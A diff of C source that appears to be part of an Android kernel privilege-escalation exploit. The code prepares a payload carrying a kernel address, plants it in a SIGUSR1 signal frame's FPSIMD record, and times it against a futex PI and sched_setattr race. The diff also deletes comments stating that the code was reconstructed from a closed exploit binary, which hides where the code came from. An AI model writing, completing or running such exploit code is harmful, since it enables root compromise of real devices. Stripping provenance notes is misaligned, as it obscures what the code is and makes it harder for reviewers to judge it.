@@ -1,11 +1,8 @@
-/* source: see 06_signal_frame_payload.h for the full derivation and safety
- * reasoning. Uses the REAL NDK <sys/ucontext.h>/<asm/sigcontext.h>
- * struct definitions throughout -- deliberately does NOT hand-compute
- * any offset into ucontext_t/sigcontext (this project already found
- * and fixed one real bug this session caused by hand-computing an
- * offset instead of trusting a tool -- see 07_futex_pi_trigger.c's delay
- * table history -- not repeating that mistake here for something this
- * much more safety-sensitive). */
+/*
+ * Constructs the PI-waiter data carried in an ARM signal frame. A SIGUSR1
+ * handler locates the FPSIMD record and copies the prepared bytes into it.
+ */
+
 #define _GNU_SOURCE
 #include <errno.h>
 #include <signal.h>
@@ -19,8 +16,7 @@
 
 #include "06_signal_frame_payload.h"
 
-#define SIGUSR1_PAYLOAD_SIZE 0x200 /* 512 bytes, matches the closed
-                                     * binary's own memset(buf,0,0x200) */
+#define SIGUSR1_PAYLOAD_SIZE 0x200
 
 static unsigned char g_payload[SIGUSR1_PAYLOAD_SIZE];
 static atomic_int g_handler_result; /* 0=not run yet, 1=success, -1=failed */
@@ -49,17 +45,6 @@ void sigusr1_build_payload(uint64_t page_base, uint64_t ashmem_misc_fops_addr) {
   put64(g_payload, 0x68, 0);
 }
 
-/* source: raw vaddr 0x3d6c-0x3e14 (the handler function itself, `e
- * asm.varsub=false`). Real algorithm, matching the KERNEL's own
- * parse_user_sigframe() validation style (magic+size checked, size
- * must be a sane positive value, scan bounded to a fixed limit) rather
- * than a naive first-match: this is deliberately not a shortcut, it
- * mirrors what was actually observed. The real handler keeps the
- * matching record pointer, finishes validating the record list, then
- * copies the 0x200-byte payload with ldrb/strb only. Keep this path
- * free of libc calls: besides matching the closed binary, it avoids a
- * lazy PLT resolution or a SIMD memcpy implementation inside the
- * signal frame that is being modified. */
 static void sigusr1_handler(int sig, siginfo_t *info, void *ucontext_v) {
   (void)sig;
   (void)info;
@@ -128,9 +113,5 @@ int sigusr1_fire_and_wait(void) {
     return 0;
   }
 
-  /* tgkill targets this thread. Signal delivery and rt_sigreturn finish
-   * before the syscall returns, exactly as assumed by the closed
-   * binary at 0x40d4-0x40e4. Do not call libc or deschedule here: the
-   * caller immediately opens the sched_setattr race window. */
   return atomic_load(&g_handler_result) == 1;
 }
